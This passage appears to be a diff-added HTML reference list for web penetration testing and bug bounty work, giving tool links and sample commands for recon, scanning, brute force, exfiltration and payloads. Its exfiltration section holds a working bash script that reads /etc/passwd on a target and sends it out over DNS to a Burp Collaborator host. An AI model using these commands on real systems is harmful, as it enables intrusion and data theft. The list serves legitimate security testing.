+<h3 id="a-namejavascript-commentsahtmljavascript-comments"><a name="JavaScript-Comments"></a>HTML/JavaScript Comments</h3>
+<p><a href="https://portswigger.net/support/using-burp-suites-engagement-tools">https://portswigger.net/support/using-burp-suites-engagement-tools</a>
+<br># Burp Engagement Tools</p>
+<h3 id="google-dorks">Google Dorks</h3>
+<p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a>
+<br># Google Hacking Database</p>
+<h3 id="a-namecspacontent-security-policy-csp"><a name="CSP"></a>Content Security Policy (CSP)</h3>
+<p><a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a>
+<br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.</p>
+<h3 id="tiny-urls-services">Tiny URLs Services</h3>
+<p><a href="https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research">https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research</a>
+<br># Cornell Tech Url Shortening Research</p>
+<p><a href="https://github.com/utkusen/urlhunter">https://github.com/utkusen/urlhunter</a>
+<br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
+<br><code>urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt</code></p>
+<p><a href="https://shorteners.grayhatwarfare.com">https://shorteners.grayhatwarfare.com</a>
+<br># Search Shortener Urls</p>
+<h3 id="graphql">GraphQL</h3>
+<p><a href="https://github.com/doyensec/graph-ql">https://github.com/doyensec/graph-ql</a>
+<br># A security testing tool to facilitate GraphQL technology security auditing efforts.</p>
+<p><a href="https://hackernoon.com/understanding-graphql-part-1-nxm3uv9">https://hackernoon.com/understanding-graphql-part-1-nxm3uv9</a>
+<br># Understanding GraphQL</p>
+<p><a href="https://graphql.org/learn/introspection/">https://graphql.org/learn/introspection/</a>
+<br># It&rsquo;s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!</p>
+<p><a href="https://jondow.eu/practical-graphql-attack-vectors/">https://jondow.eu/practical-graphql-attack-vectors/</a>
+<br># Practical GraphQL attack vectors</p>
+<p><a href="https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/">https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/</a>
+<br># Why and how to disable introspection query for GraphQL APIs</p>
+<p><a href="https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/">https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/</a>
+<br># Securing GraphQL</p>
+<p><a href="https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4">https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4</a>
+<br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.</p>
+<p><a href="https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696">https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</a>
+<br># GraphQL common vulnerabilities &amp; how to exploit them.</p>
+<h3 id="a-namegeneral-discoveringageneral"><a name="General-Discovering"></a>General</h3>
+<p><a href="https://github.com/redhuntlabs/Awesome-Asset-Discovery">https://github.com/redhuntlabs/Awesome-Asset-Discovery</a>
+<br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.</p>
+<p><a href="https://spyse.com">https://spyse.com</a>
+<br># Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.</p>
+<p><a href="https://github.com/yogeshojha/rengine">https://github.com/yogeshojha/rengine</a>
+<br># reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.</p>
+<p><a href="https://github.com/phor3nsic/favicon_hash_shodan">https://github.com/phor3nsic/favicon_hash_shodan</a>
+<br># Search for a framework by favicon</p>
+<p><a href="https://github.com/righettod/website-passive-reconnaissance">https://github.com/righettod/website-passive-reconnaissance</a>
+<br># Script to automate, when possible, the passive reconnaissance performed on a website prior to an assessment.</p>
+<h2 id="enumerating">Enumerating</h2>
+<h3 id="fingerprint">Fingerprint</h3>
+<p><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a>
+<br># WhatWeb identifies websites. Its goal is to answer the question, &ldquo;What is that Website?&rdquo;. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
+<br><code>whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com</code></p>
+<p><a href="https://builtwith.com">https://builtwith.com</a>
+<br># Find out what websites are Built With.</p>
+<p><a href="https://www.wappalyzer.com">https://www.wappalyzer.com</a>
+<br># Identify technologies on websites.</p>
+<p><a href="https://webtechsurvey.com">https://webtechsurvey.com</a>
+<br># Discover what technologies a website is built on or find out what websites use a particular web technology.</p>
+<p><a href="https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb">https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb</a>
+<br># Software Vulnerability Scanner Burp Extension</p>
+<p><a href="https://github.com/GrrrDog/weird_proxies">https://github.com/GrrrDog/weird_proxies</a>
+<br># It&rsquo;s a cheat sheet about behaviour of various reverse proxies and related attacks.</p>
+<h3 id="buckets">Buckets</h3>
+<p><a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a>
+<br># List s3 bucket permissions and keys
+<br><code>aws s3api get-bucket-acl --bucket examples3bucketname</code>
+<br><code>aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext</code>
+<br><code>aws s3api list-objects --bucket examples3bucketname</code>
+<br><code>aws s3api list-objects-v2 --bucket examples3bucketname</code>
+<br><code>aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext</code>
+<br><code>aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext</code></p>
+<p><a href="https://github.com/eth0izzle/bucket-stream">https://github.com/eth0izzle/bucket-stream</a>
+<br># Find interesting Amazon S3 Buckets by watching certificate transparency logs</p>
+<p><a href="https://buckets.grayhatwarfare.com/">https://buckets.grayhatwarfare.com/</a>
+<br># Search Public Buckets</p>
+<p><a href="https://github.com/VirtueSecurity/aws-extender">https://github.com/VirtueSecurity/aws-extender</a>
+<br># Burp Suite extension which can identify and test S3 buckets</p>
+<h3 id="cloud-enumeration">Cloud Enumeration</h3>
+<p><a href="https://github.com/andresriancho/enumerate-iam">https://github.com/andresriancho/enumerate-iam</a>
+<br># Found a set of AWS credentials and have no idea which permissions it might have?</p>
+<p><a href="https://github.com/nccgroup/ScoutSuite">https://github.com/nccgroup/ScoutSuite</a>
+<br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.</p>
+<p><a href="https://github.com/toniblyx/prowler">https://github.com/toniblyx/prowler</a>
+<br># Prowler is a command line tool that helps you with AWS security assessment, auditing, hardening and incident response.</p>
+<p><a href="https://github.com/salesforce/cloudsplaining">https://github.com/salesforce/cloudsplaining</a>
+<br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.</p>
+<p><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a>
+<br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.</p>
+<p><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a>
+<br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.</p>
+<p><a href="https://github.com/VirtueSecurity/aws-extender">https://github.com/VirtueSecurity/aws-extender</a>
+<br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.</p>
+<p><a href="https://github.com/irgoncalves/gcp_security">https://github.com/irgoncalves/gcp_security</a>
+<br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.</p>
+<p><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</a>
+<br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.</p>
+<p><a href="https://cloud.google.com/compute/docs/storing-retrieving-metadata">https://cloud.google.com/compute/docs/storing-retrieving-metadata</a>
+<br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance&rsquo;s host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.</p>
+<p><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service">https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</a>
+<br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.</p>
+<p><a href="https://www.alibabacloud.com/help/doc-detail/49122.htm">https://www.alibabacloud.com/help/doc-detail/49122.htm</a>
+<br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.</p>
+<p><a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</a>
+<br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.</p>
+<h3 id="containerization">Containerization</h3>
+<p><a href="https://github.com/stealthcopter/deepce">https://github.com/stealthcopter/deepce</a>
+<br># Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).</p>
+<h3 id="visual-identification">Visual Identification</h3>
+<p><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a>
+<br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
+<br><code>eyewitness --web --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot; --threads 10 --timeout 30 --prepend-https -f &quot;${PWD}/subdomains.txt&quot; -d &quot;${PWD}/eyewitness/&quot;</code></p>
+<p><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a>
+<br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
+<br><code>cat targets.txt | aquatone</code></p>
+<p><a href="https://github.com/sensepost/gowitness">https://github.com/sensepost/gowitness</a>
+<br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
+<br><code>gowitness scan --cidr 192.168.0.0/24 --threads 20</code></p>
+<h2 id="scanning">Scanning</h2>
+<h3 id="static-application-security-testing">Static Application Security Testing</h3>
+<p><a href="https://github.com/returntocorp/semgrep">https://github.com/returntocorp/semgrep</a>
+<br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.</p>
+<h3 id="dependency-confusion">Dependency Confusion</h3>
+<p><a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610</a>
+<br># How I Hacked Into Apple, Microsoft and Dozens of Other Companies.</p>
+<p><a href="https://github.com/dwisiswant0/nodep">https://github.com/dwisiswant0/nodep</a>
+<br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.</p>
+<p><a href="https://github.com/visma-prodsec/confused">https://github.com/visma-prodsec/confused</a>
+<br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.</p>
+<h3 id="send-emails">Send Emails</h3>
+<p><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a>
+<br># Ticket Trick</p>
+<p><a href="https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2">https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2</a>
+<br># Abusing autoresponders and email bounces</p>
+<p><br># Send multiple emails
+<br><code>while read i; do echo $i; echo -e &quot;From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}&quot; | ssmtp ${i},example2@gmail.com; done &lt; emails.txt</code></p>
+<h3 id="search-vulnerabilities">Search Vulnerabilities</h3>
+<p><a href="https://github.com/vulnersCom/getsploit">https://github.com/vulnersCom/getsploit</a>
+<br># Command line search and download tool for Vulners Database inspired by searchsploit.
+<br><code>getsploit wordpress 4.7.0</code></p>
+<p><a href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a>
+<br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
+<br><code>searchsploit -t oracle windows</code></p>
+<p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a>
+<br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.</p>
+<p><a href="https://grep.app">https://grep.app</a>
+<br># Search across a half million git repos.</p>
+<p><a href="https://github.com/0ang3el/aem-hacker">https://github.com/0ang3el/aem-hacker</a>
+<br># Tools to identify vulnerable Adobe Experience Manager (AEM) webapps.
+<br><code>python3 aem_hacker.py -u https://example.com --host your_vps_hostname_ip</code></p>
+<p><a href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a>
+<br># Jolokia Exploitation Toolkit (JET) helps exploitation of exposed jolokia endpoints.</p>
+<h3 id="web-scanning">Web Scanning</h3>
+<p><a href="https://github.com/psiinon/open-source-web-scanners">https://github.com/psiinon/open-source-web-scanners</a>
+<br># A list of open source web security scanners on GitHub.</p>
+<p><a href="https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner">https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner</a>
+<br># Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.</p>
+<p><a href="https://github.com/spinkham/skipfish">https://github.com/spinkham/skipfish</a>
+<br># Skipfish is an active web application security reconnaissance tool.
+<br><code>skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C &quot;AuthCookie=value&quot; -X /logout.aspx -o output_dir http://www.example.com/</code></p>
+<p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a>
+<br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
+<br><code>nikto -ssl -host www.example.com</code></p>
+<p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a>
+<br># WordPress Security Scanner
+<br><code>wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com</code></p>
+<p><a href="https://github.com/droope/droopescan">https://github.com/droope/droopescan</a>
+<br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.
+<br><code>droopescan scan drupal -u example.com</code></p>
+<p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a>
+<br># Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
+<br><code>nuclei -l urls.txt -t cves/ -t files/ -o results.txt</code></p>
+<p><a href="https://github.com/six2dez/reconftw">https://github.com/six2dez/reconftw</a>
+<br># reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
+<br><code>reconftw.sh -d target.com -a</code></p>
+<p><a href="https://gobies.org">https://gobies.org</a>
+<br># The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.</p>
+<p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a>
+<br># By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
+<br><code>python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;Submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</code></p>
+<p><a href="https://github.com/MrCl0wnLab/ShellShockHunter">https://github.com/MrCl0wnLab/ShellShockHunter</a>
+<br># Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
+<br><code>python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl</code></p>
+<p><a href="https://github.com/crashbrz/WebXmlExploiter/">https://github.com/crashbrz/WebXmlExploiter/</a>
+<br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.</p>
+<h3 id="http-request-smuggling">HTTP Request Smuggling</h3>
+<p><a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a>
+<br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
+<br><code>python3 smuggler.py -q -u https://example.com/</code>
+<br>
+<br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
+<br><code>echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &amp;&gt;/dev/null</code></p>
+<p><a href="https://github.com/neex/http2smugl">https://github.com/neex/http2smugl</a>
+<br># This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -&gt; HTTP/1.1 conversion by the frontend server.
+<br><code>http2smugl detect https://example.com/</code></p>
+<p><a href="https://github.com/BishopFox/h2csmuggler">https://github.com/BishopFox/h2csmuggler</a>
+<br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
+<br><code>h2csmuggler.py -x https://example.com/ --test</code></p>
+<p><a href="https://github.com/0ang3el/websocket-smuggle">https://github.com/0ang3el/websocket-smuggle</a>
+<br># Smuggling HTTP requests over fake WebSocket connection.</p>
+<p><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a>
+<br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.</p>
+<p><a href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a>
+<br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.</p>
+<p><a href="https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142">https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142</a>
+<br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.</p>
+<p><a href="https://www.intruder.io/research/practical-http-header-smuggling">https://www.intruder.io/research/practical-http-header-smuggling</a>
+<br># Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning and request smuggling vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as &ldquo;header smuggling&rdquo;. This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.</p>
+<p><a href="https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/">https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/</a>
+<br># Two Years Ago @albinowax Shown Us A New Technique To PWN Web Apps So Inspired By This Technique AND @defparam&rsquo;s Tool , I Have Been Collecting A Lot Of Mutations To Achieve Request Smuggling.</p>
+<p><a href="https://github.com/GrrrDog/weird_proxies">https://github.com/GrrrDog/weird_proxies</a>
+<br># It&rsquo;s a cheat sheet about behaviour of various reverse proxies and related attacks.</p>
+<h3 id="subdomain-takeover">Subdomain Takeover</h3>
+<p><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a>
+<br># Subdomain Takeover Scanner
+<br><code>tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt</code></p>
+<p><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a>
+<br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it&rsquo;s redesign, it has been aimed with speed and efficiency in mind.
+<br><code>SubOver -l subdomains.txt</code></p>
+<h3 id="a-namesqli-scanningasqli-sql-injection"><a name="SQLi-Scanning"></a>SQLi (SQL Injection)</h3>
+<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>
+<br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+<br><code>sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch</code>
+<br><code>sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch</code></p>
+<h3 id="repositories-scanning">Repositories Scanning</h3>
+<p><a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a>
+<br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
+<br><code>gitleaks --github-org=organization --threads=4 -v --disk</code></p>
+<p><a href="https://github.com/michenriksen/gitrob">https://github.com/michenriksen/gitrob</a>
+<br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.</p>
+<p><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a>
+<br># Searches through git repositories for secrets, digging deep into commit history and branches.</p>
+<p><a href="https://github.com/awslabs/git-secrets">https://github.com/awslabs/git-secrets</a>
+<br># Prevents you from committing passwords and other sensitive information to a git repository.</p>
+<p><a href="https://github.com/eth0izzle/shhgit">https://github.com/eth0izzle/shhgit</a>
+<br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.</p>
+<p><a href="https://pinatahub.incognita.tech/">https://pinatahub.incognita.tech/</a>
+<br># PinataHub allows you to explore a fraction of the 4M+ passwords and secrets committed in public GitHub repositories, detected by GoldDigger.</p>
+<h3 id="google-dorks-scanning">Google Dorks Scanning</h3>
+<p><a href="https://github.com/opsdisk/pagodo">https://github.com/opsdisk/pagodo</a>
+<br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
+<br><code>python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1</code></p>
+<h3 id="cors-misconfigurations">CORS Misconfigurations</h3>
+<p><a href="https://github.com/s0md3v/Corsy">https://github.com/s0md3v/Corsy</a>
+<br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
+<br><code>python3 corsy.py -u https://example.com</code></p>
+<h2 id="monitoring">Monitoring</h2>
+<h3 id="cve">CVE</h3>
+<p><a href="https://www.opencve.io/">https://www.opencve.io/</a>
+<br># OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.</p>
+<h2 id="attacking">Attacking</h2>
+<h3 id="brute-force">Brute Force</h3>
+<p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>
+<br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
+<br><code>hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh</code></p>
+<p><a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>
+<br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.
+<br><code>unshadow /etc/passwd /etc/shadow &gt; mypasswd.txt</code>
+<br><code>john mypasswd.txt</code></p>
+<p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a>
+<br># Hashcat is a password recovery tool.
+<br><code>hashcat -m 0 -a 0 hashes.txt passwords.txt</code></p>
+<p><a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a>
+<br># Rotate the source IP address in order to bypass rate limits</p>
+<h3 id="exfiltration">Exfiltration</h3>
+<p><a href="https://github.com/vp777/procrustes">https://github.com/vp777/procrustes</a>
+<br># A bash script that automates the exfiltration of data over dns</p>
+<p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a>
+<br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p>
+<p><a href="https://github.com/fbkcs/ThunderDNS">https://github.com/fbkcs/ThunderDNS</a>
+<br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.</p>
+<p><br># Pure bash exfiltration over dns
+<br>## Execute on target server (replace YOURBCID)</p>
+<pre><code>CMD=&quot;cat /etc/passwd&quot;
+HID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
+CMDID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
+BC=&quot;YOURBCID.burpcollaborator.net&quot;
+D=&quot;$HID-$CMDID.$BC&quot;
+M=$($CMD 2&gt;&amp;1); T=${#M}; O=0; S=30; I=1; while [ &quot;${T}&quot; -gt &quot;0&quot; ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&amp;&gt;/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
+</code></pre><p><br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results</p>
+<pre><code>BCPURL=&quot;https://polling.burpcollaborator.net/burpresults?biid=YOURBIID&quot;
+RESULTS=$(curl -sk &quot;${BCPURL}&quot;)
+</code></pre><p><br>## Get IDs available</p>
+<pre><code>echo &quot;${RESULTS}&quot; | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'&quot;protocol&quot;:&quot;dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never &quot;^[[:digit:]]+\..*\..*\.$BC$&quot;; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u
+</code></pre><p><br>## Update ID and get command result (repeat for each ID)</p>
+<pre><code>ID=&quot;xxxxx-xxxxx&quot;
+echo &quot;${RESULTS}&quot; | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'&quot;protocol&quot;:&quot;dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep &quot;^[[:digit:]]+\..*\..*\.$BC$&quot;; fi; done | egrep &quot;$ID&quot; | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
+</code></pre><p><a href="https://www.slideshare.net/snyff/code-that-gets-you-pwnsd">https://www.slideshare.net/snyff/code-that-gets-you-pwnsd</a>
+<br># Code that gets you pwn(s|'d). Very intersting bypasses ideas.</p>
+<p><a href="https://github.com/aufzayed/bugbounty/tree/main/403-bypass">https://github.com/aufzayed/bugbounty/tree/main/403-bypass</a>
+<br># Common 403 bypass.</p>
+<h2 id="manual">Manual</h2>
+<h3 id="payloads">Payloads</h3>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>
+<br># PayloadsAllTheThings</p>
+<p><a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html</a>
+<br># Unicode normalization good for WAF bypass.</p>
+<p><br># XSS
+<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>
+<br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.
+<br><a href="https://www.gremwell.com/firefox-xss-302">https://www.gremwell.com/firefox-xss-302</a>
+<br># Forcing Firefox to Execute XSS Payloads during 302 Redirects.</p>
+<p><br># XXE
+<br><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>
